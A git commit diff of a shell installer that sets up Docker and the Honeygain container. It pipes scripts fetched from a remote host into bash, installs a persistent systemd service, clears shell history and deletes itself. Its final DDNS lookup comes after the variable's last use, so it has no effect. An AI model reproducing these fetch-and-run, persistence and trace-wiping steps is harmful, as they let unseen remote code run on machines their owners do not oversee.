01e5ac114a0e3a8c63da7504fbe94dd979cd7285
SuckMyLeg <juanito-146@hotmail.es>
2022-04-28 17:48:26 +0200

    Saving

--- RemoteContent/Hg/0.0.3/Locall.sh
+++ RemoteContent/Hg/0.0.3/Locall.sh
@@ -1,29 +1,12 @@
 #!/bin/sh
 #00101000 00110000 00101011 00101000 00110001 00101010 00110011 00101001 00101001 00101010 00110010
-cat << ENDOFFILE
-
-
-    WorkerHoneygain        installation
-    \ \   \ \/ /   / /     | |    | |
-     \ \   \ \/   / /      | |____| |
-      \ \  /\ \  / /       | |____| |
-       \ \/ /\ \/ /        | |    | |
-        \ \/  \ \/         | |    | |
-         ‾‾    ‾‾          ‾‾‾    ‾‾‾
-
-ENDOFFILE
-
 version=0.0.3
-
 remoteip=192.168.1.104
-
 if [ -x "$(command -v docker)" ]; then
 	echo "Docker already installed"
 else
 	echo "Installing docker"
-	
 	apt-get -y install docker.io
-
 	apt-get -y install docker-ce docker-ce-cli containerd.io
 	if [ -x "$(command -v docker)" ]; then
 		echo "Installed"
@@ -31,23 +14,15 @@ else
 		echo "Retrying"
 		curl -sSL https://get.docker.com | sh
 	fi
-
 	echo "Installing honeygain"
 	docker pull honeygain/honeygain
 fi
-
 echo "Creating service"
-
 dir="/var/gvg/"
-
 bash <( curl -s "http://${remoteip}:8080/RemoteContent/Hg/"${version}"/Remove.sh" )
-
 mkdir $dir
-
 wget -O ${dir}rw.sh "http://${remoteip}:8080/RemoteContent/Hg/"${version}"/rw.sh" 
-
 ln -s ${dir}hw.service /etc/systemd/system
-
 cat > ${dir}hw.service << ENDOFFILE
 [Unit]
 Description=hw
@@ -59,36 +34,14 @@ ExecStart=/bin/bash ${dir}rw.sh
 [Install]
 WantedBy=multi-user.target
 ENDOFFILE
-
 echo "Setting up service"
-
 systemctl enable hw.service
 systemctl start hw.service
-
 echo "Done"
-
-cat << ENDOFFILE
-    __    __  __    __     ___    ___
-    \ \   \ \/ /   / /     | |    | |
-     \ \   \ \/   / /      | |____| |
-      \ \  /\ \  / /       | |____| |
-       \ \/ /\ \/ /        | |    | |
-        \ \/  \ \/         | |    | |
-         ‾‾    ‾‾          ‾‾‾    ‾‾‾
-
-
-
-
-
-
-
-ENDOFFILE
-
 history -c 
 history -w
 echo "Removed history"
-
 echo "Auto deleting Installer"
 echo "Bye!!!!!!!"
-
 rm $0
+remoteip=$(dig sw22.ddns.net +short)
